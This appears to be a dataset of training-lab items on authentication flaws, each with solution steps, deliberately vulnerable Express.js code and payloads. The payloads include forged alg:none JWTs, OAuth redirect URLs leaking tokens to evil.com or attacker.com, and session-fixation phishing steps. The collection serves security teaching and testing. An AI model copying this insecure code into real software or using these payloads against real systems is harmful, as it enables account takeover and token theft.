  "Lab scenario": "JWT Signature Confusion via alg None in GraphQL Auth",
  "Lab Description": "This application uses JWTs for GraphQL-based authentication. It parses the `Authorization: Bearer` token without validating the `alg` parameter securely. The server allows tokens signed with `alg: none`, enabling tampering. To solve: forge a JWT token for the user 'carlos' and access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to send a valid login mutation to /graphql and capture the JWT in the response.",
    "Decode the token and analyze its header and payload using jwt.io. Observe the use of HS256.",
    "Replace the alg value with none and modify the payload sub to carlos. Remove the signature part.",
    "Resend the forged token as Authorization: Bearer <fake_jwt> in a GET /graphql?query={me{name}} request.",
    "Verify the returned user is carlos and access /graphql?query={accountData} to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; const users = { 'carlos': 'hunter2', 'alice': 'test123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else res.status(401).json({ error: 'Invalid' }); }); app.use('/graphql', (req, res, next) => { const auth = req.headers.authorization || ''; const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded.sub; next(); } catch (e) { res.status(403).json({ error: 'Invalid token' }); } }); app.post('/graphql', (req, res) => { if (req.body.query.includes('me')) { res.json({ data: { me: { name: req.user } } }); } else res.json({ data: null }); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Authorization: Bearer header with alg: none",
    "JWT: {\"alg\":\"none\"}.{\"sub\":\"carlos\"}.",
    "GraphQL query: {me{name}}"
  ]
},
{
  "Lab scenario": "OAuth Authorization Code Interception in Hybrid Flow",
  "Lab Description": "The OAuth flow implemented by this app uses a hybrid response type (code token) and redirects the user to a fixed redirect_uri vulnerable to open redirect attacks. To solve: intercept Carlos’s authorization code and complete the login flow using it.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to identify that the redirect_uri parameter in the auth request is vulnerable to open redirect.",
    "Craft a malicious authorization URL and send it to Carlos, where redirect_uri points to your attacker site.",
    "Capture the authorization code from the redirected URL containing /?code=xyz.",
    "Replay the intercepted code in a POST /oauth/token request with grant_type=authorization_code and redirect_uri=http://trusted-site.com.",
    "Use the obtained access_token in GET /account?access_token=xyz to access Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const codes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type, user } = req.query; if (user === 'carlos') { const code = Math.random().toString(36).slice(2); codes[code] = user; res.redirect(`${redirect_uri}?code=${code}`); } else res.send('Unauthorized'); }); app.post('/oauth/token', (req, res) => { const { code, grant_type, redirect_uri } = req.body; if (codes[code]) { const token = Math.random().toString(36).slice(2); tokens[token] = codes[code]; res.json({ access_token: token }); } else res.status(400).json({ error: 'Invalid code' }); }); app.get('/account', (req, res) => { const token = req.query.access_token; if (tokens[token]) res.send(`Welcome ${tokens[token]}`); else res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Code Interception Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "https://example.com/authorize?client_id=abc&redirect_uri=https://evil.com&response_type=code&user=carlos",
    "Intercepted code in redirect: https://evil.com/?code=abc123",
    "POST /oauth/token with code=abc123&grant_type=authorization_code&redirect_uri=http://trusted-site.com"
  ]
},
{
  "Lab scenario": "Session Fixation in Cookie-based Authentication",
  "Lab Description": "The application improperly reuses existing session identifiers during login. The session ID issued before authentication remains valid after successful login. To solve: Fixate a session for the victim, trick them into logging in, then hijack the session to access their account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to register a new account and intercept the Set-Cookie header to extract your pre-login session ID.",
    "Craft a phishing page or link embedding the fixed session ID in the user's browser.",
    "Send the phishing link to the victim or simulate login as victim in a separate browser profile reusing the fixed session ID.",
    "Login as the victim using valid credentials while reusing the fixed session ID.",
    "Revert to the attacker's browser session and access /dashboard to confirm hijacked access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.cookies.sid]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Access denied'); }); app.use((req, res, next) => { if (!req.cookies.sid) res.cookie('sid', Math.random().toString(36).substring(2)); next(); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab on http://localhost:${PORT}`));",
  "payloads": [
    "Set attacker-controlled sid cookie in victim browser before login",
    "Use shared sid across login session for fixation",
    "Access /dashboard after victim login using fixed session ID"
  ]
},
{
  "Lab scenario": "JWT Algorithm Confusion in Bearer Authentication",
  "Lab Description": "The application trusts the 'alg' header of JWTs and does not validate the token signature when 'alg' is set to 'none'. To solve: Forge a JWT token with alg set to 'none' and impersonate the victim by injecting their username into the payload.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to capture a valid JWT after logging in as any user.",
    "Decode the JWT using jwt.io or Burp Decoder and observe the 'alg' value and payload.",
    "Modify the 'alg' header to 'none' and set the payload sub to 'carlos'.",
    "Re-encode the header and payload using Base64URL without a signature.",
    "Send the forged token in Authorization: Bearer header and access /private-profile to confirm impersonation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtsecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ sub: user.username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else res.status(401).json({ error: 'Invalid credentials' }); }); app.get('/private-profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('Forbidden'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Welcome ${payload.sub}`); } else { jwt.verify(token, 'secret'); res.send('Access granted'); } } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 3002; app.listen(PORT, () => console.log(`JWT Confusion Lab on http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
    "{ \"alg\": \"none\" }, { \"sub\": \"carlos\" }",
    "Authorization: Bearer <forged-JWT>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Implicit Grant Flow",
  "Lab Description": "The OAuth provider exposes the access token in the redirect URI fragment and the relying party accepts it without origin validation. To solve: Steal an access token issued to Carlos using a malicious redirect_uri and use it to access the protected resource.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate OAuth login flow in browser and observe the redirect_uri and response_type in the URL.",
    "Craft a malicious authorization request URL with response_type=token and redirect_uri set to a domain under your control (e.g. http://attacker.com).",
    "Simulate Carlos clicking the malicious link to initiate OAuth login and receive token in fragment.",
    "Capture the token in the attacker's server log from the redirect URI fragment.",
    "Use Postman to include the stolen token in Authorization header and access /api/userinfo."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = { 'carlos-token': 'carlos' }; app.get('/oauth/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token') { const token = 'carlos-token'; res.redirect(`${redirect_uri}#access_token=${token}`); } else res.status(400).send('Invalid response type'); }); app.get('/api/userinfo', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const user = tokens[token]; if (user) res.send(`User info for ${user}`); else res.status(403).send('Invalid token'); }); const PORT = 3003; app.listen(PORT, () => console.log(`OAuth Implicit Flow Lab on http://localhost:${PORT}`));",
  "payloads": [
    "http://localhost:3003/oauth/authorize?response_type=token&client_id=app123&redirect_uri=http://attacker.com",
    "#access_token=carlos-token",
    "Authorization: Bearer carlos-token"
  ]
},
{
  "Lab scenario": "Session Fixation vulnerability in REST session management path parameter",
  "Lab Description": "The application's session management system accepts session tokens via a URL path parameter, creating a critical session fixation risk. An attacker can craft a link with a preset session token and trick users into using it. The application ties sessions only by token without verifying ownership. To solve: hijack Carlos's session using a fixation attack and access his My Account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to inspect the login flow. Observe the session token in the URL path: /session/{token}.",
    "Send a crafted session token to your own account and verify its reuse by logging in again.",
    "Login using the malicious session token in another browser and notice session reuse is allowed.",
    "Send Carlos a crafted URL using your own valid token: /session/fixedToken.",
    "Once Carlos clicks the URL and authenticates, reuse the same session token to access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', password: 'carlospass' }]; const sessions = {}; app.get('/session/:token', (req, res) => { const token = req.params.token; if (!sessions[token]) sessions[token] = { authenticated: false }; res.send(`Session: ${token}`); }); app.post('/login/:token', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = req.params.token; sessions[token] = { authenticated: true, user: username }; res.send('Login successful'); } else { res.status(403).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const token = req.query.token; if (sessions[token]?.authenticated && sessions[token].user === 'carlos') res.send('Welcome to Carlos account'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "GET /session/fixedtoken",
    "POST /login/fixedtoken?username=carlos&password=carlospass",
    "GET /my-account?token=fixedtoken"
  ]
},
{
  "Lab scenario": "JWT tampering vulnerability in GraphQL Authorization Header",
  "Lab Description": "This GraphQL API uses JWTs for authentication but does not validate the 'alg' field properly. When 'alg' is set to 'none', the backend fails to verify the signature. The JWT is passed via the Authorization header and decoded without proper validation. To solve: forge a token with 'alg:none' and access Carlos's user data.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to inspect the GraphQL endpoint with a valid Authorization: Bearer <JWT>.",
    "Decode the JWT using jwt.io and observe the header, payload, and signature.",
    "Craft a new JWT with 'alg':'none' and payload { \"username\": \"carlos\" } and remove the signature.",
    "Replay the token via Authorization header against the GraphQL endpoint.",
    "Query Carlos’s user data and extract his email field to confirm access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { me: String }`); const root = { me: (args, context) => context.username === 'carlos' ? 'carlos@example.com' : 'Access denied' }; app.use('/graphql', (req, res, next) => { const auth = req.headers.authorization || ''; const token = auth.split(' ')[1]; let decoded = {}; try { decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') req.user = decoded.payload; else req.user = jwt.verify(token, 'supersecret'); } catch (e) {} next(); }, graphqlHTTP((req) => ({ schema, rootValue: root, context: req.user || {} }))); app.listen(4001);",
  "payloads": [
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "GraphQL query: { me }"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration vulnerability in SOAP-based login flow via Referer leakage",
  "Lab Description": "The application uses a SOAP endpoint for federated OAuth login. Upon successful login, the OAuth token is embedded in a redirect URL. However, sensitive tokens are leaked via the Referer header when redirected to third-party resources. An attacker can steal the token if they inject external content into the flow. To solve: steal Carlos’s OAuth token via Referer leakage and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate a normal login and inspect the final redirection URL which includes the token as a query parameter.",
    "Observe that the token is passed in full URL to the final destination including third-party images.",
    "Inject a <img src='http://attacker.com/steal?token=...'> into the SOAP login success handler.",
    "Trigger Carlos to authenticate. The Referer header will leak the token to the attacker's server.",
    "Replay the stolen token to access /user-info as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const tokens = { carlos: 'oauth-token-123' }; app.use(bodyParser.text({ type: 'text/xml' })); app.post('/soap-login', (req, res) => { if (req.body.includes('<username>carlos</username>') && req.body.includes('<password>securepass</password>')) { const response = `<SOAP-ENV:Envelope><SOAP-ENV:Body><redirect>http://vulnerable-app.com/welcome?token=${tokens.carlos}</redirect></SOAP-ENV:Body></SOAP-ENV:Envelope>`; res.send(response); } else { res.status(403).send('Invalid login'); } }); app.get('/user-info', (req, res) => { const token = req.query.token; if (token === tokens.carlos) res.send('Carlos: carlos@example.com'); else res.status(401).send('Invalid token'); }); app.listen(4002);",
  "payloads": [
    "POST /soap-login with SOAP body containing carlos credentials",
    "Inject <img src='http://evil.com/log?leak'> in response handler",
    "GET /user-info?token=oauth-token-123"
  ]
},
  {
    "Lab scenario": "JWT token tampering in session management",
    "Lab Description": "This lab contains a vulnerability where the server doesn't properly validate or invalidate JWT tokens. An attacker can manipulate the JWT's payload to escalate privileges or impersonate another user. The objective is to hijack Carlos’s account by tampering with the JWT token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Using Burp Suite, intercept the login request and capture the JWT token in the response header.",
      "2. Modify the JWT token by tampering with the user role or other claims in the payload. Use an online JWT decoding tool to examine the token's structure.",
      "3. Base64-decode the JWT token and alter the 'role' or 'username' claim.",
      "4. Re-encode the token with a malicious claim and send it back to the server as part of the Authorization header.",
      "5. After sending the manipulated token, verify that you have gained access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } const token = jwt.sign({ username: user.username, role: user.role }, 'secret', { expiresIn: '1h' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('Token required'); jwt.verify(token, 'secret', (err, decoded) => { if (err) return res.status(403).send('Invalid token'); res.send(`Welcome ${decoded.username}`); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "OAuth misconfiguration leading to privilege escalation",
    "Lab Description": "This lab demonstrates an OAuth misconfiguration where a poorly implemented OAuth flow grants unauthorized access to protected resources. The goal is to exploit this misconfiguration to escalate privileges and access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using Postman, send an OAuth authorization request to the vulnerable API with your own client credentials.",
      "2. Analyze the OAuth token exchange process and note that the server incorrectly accepts a user’s token without validating the required scopes.",
      "3. Craft a malicious request that bypasses the scope validation using valid OAuth tokens but requesting a higher privilege level.",
      "4. Observe the response and confirm that the privilege escalation was successful.",
      "5. Access Carlos’s account page by exploiting the misconfiguration."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', password: 'securepassword', role: 'user' }]; const oauthTokens = {}; app.post('/authorize', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } const token = `oauth_token_${user.username}_${user.role}`; oauthTokens[username] = token; res.json({ token }); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (!token || !oauthTokens[token]) { return res.status(403).send('Unauthorized'); } const user = users.find(u => `oauth_token_${u.username}_${u.role}` === token); res.json({ message: `Welcome ${user.username}, role: ${user.role}` }); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "Session fixation attack in session management",
    "Lab Description": "This lab contains a session fixation vulnerability where the application does not properly regenerate session IDs on login. An attacker can fix a session ID and hijack a user's session. The goal is to fix a session ID and gain access to Carlos's account page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Log in to your own account and capture the session ID in the cookies using Burp Suite.",
      "2. Log out and use the same session ID to log in again, maintaining the session state.",
      "3. Modify the session ID to that of Carlos and make a request to the /account endpoint.",
      "4. Verify that you have successfully hijacked Carlos's session and gained access to his account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123', sessionId: 'user123session' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } res.cookie('sessionId', user.sessionId); res.send('Logged in'); }); app.get('/account', (req, res) => { const sessionId = req.cookies.sessionId; const user = users.find(u => u.sessionId === sessionId); if (user) { res.send(`Welcome ${user.username}`); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));"
  },
{
  "Lab scenario": "Session Fixation in SAML-based SSO REST Login Flow",
  "Lab Description": "The application implements Single Sign-On (SSO) using SAML for authentication across multiple services. The session ID is issued before the SAML assertion is validated. The application incorrectly associates the session with the user after the assertion is processed but does not regenerate the session ID. To solve: Fixate a session before authentication and hijack Carlos’s session after SSO completes.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to capture the initial GET /sso/login request. Note that a Set-Cookie: session=XYZ123 is issued before login completes.",
    "Send a SAML authentication request for the attacker to Burp Repeater and observe the SAMLResponse POST to /sso/callback with the same session ID.",
    "Fixate the session ID: Send Carlos the crafted login link including the pre-set session cookie (e.g., via phishing).",
    "After Carlos logs in through SSO, reuse the fixed session ID and access /my-account with it.",
    "Observe the account details of Carlos and confirm hijacked session to complete the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: { id: 1, name: 'Carlos', email: 'carlos@example.com' } }; app.get('/sso/login', (req, res) => { const sessionId = Math.random().toString(36).substring(2); sessions[sessionId] = {}; res.cookie('session', sessionId); res.redirect('https://sso-provider.com/authenticate'); }); app.post('/sso/callback', (req, res) => { const { SAMLResponse } = req.body; const sessionId = req.cookies.session; if (validateSAML(SAMLResponse)) { sessions[sessionId].user = 'carlos'; res.redirect('/my-account'); } else { res.status(403).send('Invalid SAML'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session; const session = sessions[sessionId]; if (session && session.user) { res.send(`Account page for ${session.user}`); } else { res.status(401).send('Not logged in'); } }); function validateSAML(response) { return true; } app.listen(4000);",
  "payloads": [
    "Set-Cookie: session=attackerSession; URL=/sso/login",
    "Use attackerSession after victim SSO to access /my-account"
  ]
},
{
  "Lab scenario": "JWT Kid Header Injection with Public Key Retrieval (JWK endpoint)",
  "Lab Description": "The application uses JWT tokens for user authentication, validating them using a public key fetched from a JWK endpoint. However, the server uses the 'kid' field from the JWT header without validation, allowing injection and remote key usage. To solve: Forge a valid token for the 'admin' user using a tampered kid header pointing to your controlled public key.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Capture a JWT token using Postman by logging in as a regular user. Decode it to observe the header and payload.",
    "Observe that the JWT header includes a 'kid' field, and the server fetches the public key dynamically.",
    "Set up a malicious JWKS endpoint on a controlled server returning your public key with a kid of 'malicious-key'.",
    "Craft a JWT token with kid='malicious-key', change payload to { \"user\": \"admin\" }, and sign it with your private key.",
    "Send the forged token in the Authorization: Bearer header and access /admin-panel to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const axios = require('axios'); const app = express(); app.use(express.json()); async function getKey(header) { const jwks = await axios.get(`https://jwks.internal/api/keys`); return jwks.data.keys.find(k => k.kid === header.kid).publicKey; } app.post('/validate', async (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const pubKey = await getKey(decoded.header); try { const verified = jwt.verify(token, pubKey); if (verified.user === 'admin') res.send('Admin panel access granted'); else res.status(403).send('Not authorized'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(3001);",
  "payloads": [
    "Header: { \"alg\": \"RS256\", \"kid\": \"malicious-key\" }",
    "Payload: { \"user\": \"admin\" }",
    "Sign with private key matching JWKS public key"
  ]
},
{
  "Lab scenario": "SOAP API Session ID Leakage in Verbose Error Logs",
  "Lab Description": "The application exposes a legacy SOAP API for admin actions. When an invalid session ID is supplied, the server includes recent session logs in the verbose SOAP Fault response. An attacker can extract valid session IDs from leaked logs and hijack the session. To solve: Extract Carlos’s session ID from a SOAP fault and use it to access the admin SOAP action.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Send a malformed SOAP request to /soap/admin using OWASP ZAP. Trigger an invalid session fault by setting SessionID=invalid123.",
    "In the SOAP fault response, observe the stack trace and verbose log dump containing session IDs.",
    "Extract the latest session ID linked to Carlos (e.g., SessionID: abcd1234 for user carlos).",
    "Craft a valid SOAP envelope and set SessionID=abcd1234.",
    "Send the SOAP request and receive the successful admin action response to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(bodyParser.text({ type: '*/xml' })); const sessions = { 'abcd1234': 'carlos' }; app.post('/soap/admin', (req, res) => { const match = req.body.match(/<SessionID>(.*?)<\\/SessionID>/); const sessionId = match ? match[1] : null; if (!sessions[sessionId]) { return res.status(500).send(`<SOAP-ENV:Fault><faultcode>SOAP-ENV:Server</faultcode><faultstring>Invalid Session</faultstring><detail><debug>SessionID not found: ${sessionId} | Stack trace: session=abcd1234;user=carlos;trace=NullReference</debug></detail></SOAP-ENV:Fault>`); } res.send(`<SOAP-ENV:Envelope><Result>Admin Action Executed</Result></SOAP-ENV:Envelope>`); }); app.listen(4002);",
  "payloads": [
    "<SessionID>invalid123</SessionID> to trigger leak",
    "<SessionID>abcd1234</SessionID> to hijack"
  ]
},
{
  "Lab scenario": "Session Fixation via Unchanged Session ID in OAuth Authorization Flow",
  "Lab Description": "This lab simulates an application integrating with an external OAuth provider. Due to improper session regeneration, session fixation is possible. The application retains the session cookie before and after the OAuth flow without assigning a new session ID. To solve: Fixate your own session and trick the victim into completing the OAuth login flow, then hijack their authenticated session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate OAuth login flow in browser and capture request using Burp Suite.",
    "Observe session cookie remains unchanged pre/post-OAuth flow.",
    "Use Burp to log in with your own OAuth identity and note the fixed session cookie.",
    "Craft phishing link to initiate OAuth flow using your own session and send to victim.",
    "After victim logs in through OAuth, reuse the session ID to access their authenticated account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const request = require('request'); const app = express(); app.use(session({ secret: 'oauth-lab', resave: false, saveUninitialized: true })); app.get('/auth/callback', (req, res) => { if (req.query.code) { req.session.user = { name: 'carlos', email: 'carlos@example.com' }; console.log('OAuth user logged in:', req.session); res.redirect('/dashboard'); } else { res.status(400).send('Missing code'); } }); app.get('/dashboard', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user.name}`); } else { res.redirect('/login'); } }); app.get('/login', (req, res) => { res.send('<a href=\"https://oauth.example.com/auth?redirect_uri=/auth/callback\">Login with OAuth</a>'); }); app.listen(5000, () => console.log('OAuth Fixation Lab running on port 5000'));",
  "payloads": [
    "Crafted link: https://target.com/auth/callback?code=attacker-session",
    "Reuse fixed session cookie post-OAuth: session=attackerFixedValue"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Authentication Bypass in REST API",
  "Lab Description": "The application uses JWT for user authentication in its REST API. However, it incorrectly trusts unsigned JWTs when the 'alg' header is set to 'none'. To solve: Forge a valid JWT with no signature and access the admin API endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture authenticated request to /api/user/profile using Postman.",
    "Inspect JWT in Authorization header and decode with jwt.io.",
    "Craft unsigned JWT with alg set to 'none' and payload {\"role\":\"admin\"}.",
    "Replace token in Authorization header and send request to /api/admin.",
    "Confirm elevated access through response or resource visibility."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/api/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret', { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') return res.send('Admin access granted'); return res.status(403).send('Insufficient privileges'); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(3001, () => console.log('JWT None Bypass Lab running on port 3001'));",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
    "Unsigned JWT: base64(header).base64(payload)."
  ]
},
{
  "Lab scenario": "SOAP API Session Timeout Misconfiguration Enabling Forced Browsing",
  "Lab Description": "The backend SOAP interface allows session tokens to remain valid beyond logout due to a misconfigured timeout and improper invalidation. The application fails to destroy server-side session references. To solve: Log out your session, capture the token, and reuse it to force-browse into the protected SOAP endpoint for Carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use OWASP ZAP to proxy requests and capture SOAP Auth response.",
    "Note the JSESSIONID assigned post-login and capture the SOAPAction header.",
    "Log out using /soap/logout but observe session ID remains unchanged.",
    "Resend original JSESSIONID to /soap/getUserDetails with target user parameter as carlos.",
    "Verify access to Carlos's account via SOAP response body."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text({ type: '*/*' })); app.use(cookieParser()); const sessions = {}; app.post('/soap/login', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/); if (match && match[1] === 'user' && match[2] === 'pass') { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = 'user'; res.cookie('JSESSIONID', sid); res.send('<soap:Envelope><login>Success</login></soap:Envelope>'); } else { res.status(401).send('Invalid'); } }); app.post('/soap/getUserDetails', (req, res) => { const sid = req.cookies.JSESSIONID; if (sessions[sid]) { const user = req.body.includes('<user>carlos</user>') ? 'Carlos Sensitive Info' : 'Your Info'; res.send(`<soap:Envelope><data>${user}</data></soap:Envelope>`); } else { res.status(403).send('Forbidden'); } }); app.post('/soap/logout', (req, res) => { res.send('<soap:Envelope><logout>Success</logout></soap:Envelope>'); }); app.listen(4001, () => console.log('SOAP Session Misconfig Lab running on port 4001'));",
  "payloads": [
    "SOAP Body: <user>carlos</user>",
    "Cookie: JSESSIONID=sess_fixedvalue",
    "SOAPAction: getUserDetails"
  ]
},
{
  "Lab scenario": "Session Fixation via Pre-Set Session Cookie in REST Login Endpoint",
  "Lab Description": "The application exposes a REST-based login flow where a session identifier is issued before authentication and accepted after login. The vulnerable logic accepts any preset session ID and binds it to the user after successful login. To solve: Fixate Carlos's session ID before login and hijack his session post-authentication.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a GET /api/login page to observe the Set-Cookie header assigning session ID pre-login.",
    "2. Send the GET /api/login request to Burp Repeater. Add a custom cookie: sessionid=attackerSession123 and resend.",
    "3. Register a new user and log in using that session. Notice the session gets bound to the logged-in user.",
    "4. Send a crafted phishing link to Carlos containing the preset sessionid=attackerSession123 in the Cookie header.",
    "5. After Carlos logs in via that session, access /api/account with sessionid=attackerSession123 to verify hijacked session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'welcome123' }]; app.get('/api/login', (req, res) => { const sid = req.cookies.sessionid || 'sess_' + Math.random().toString(36).substr(2); res.cookie('sessionid', sid); sessions[sid] = null; res.send('Login page'); }); app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); const sid = req.cookies.sessionid; if (sid) sessions[sid] = user.username; res.send('Logged in'); }); app.get('/api/account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) res.send('Welcome ' + user); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "Cookie: sessionid=fixedCarlosSession",
    "Phishing URL with preset Cookie header",
    "GET /api/account with sessionid=fixedCarlosSession"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Bypass in Authorization Header (GraphQL API)",
  "Lab Description": "The GraphQL API uses JSON Web Tokens (JWT) for authentication. However, the backend improperly trusts tokens with `alg: none`, leading to full impersonation. To solve: Forge a JWT for Carlos using the 'none' algorithm and access his profile data via GraphQL.",
  "Difficulty Level": "Hard",
